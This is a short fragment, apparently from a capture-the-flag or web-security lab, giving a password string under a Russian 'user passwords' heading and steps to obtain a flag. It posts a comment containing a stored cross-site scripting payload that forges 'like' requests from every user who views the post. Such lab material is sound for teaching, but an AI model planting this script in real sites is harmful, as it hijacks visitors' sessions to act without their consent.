# Пароли пользователей
1qazxsw23edcvfr45tgbnhy6

### 1.3 How to break it

- Register 5 users.
- Using one user, leave a comment like that under a post:
```html
<script>
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "/like/1", true);
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    xhr.send("value=1");
</script>
```
- Auth with each user and visit the post.
- See CSRF_FLAG_MASTER flag after it on a post page.
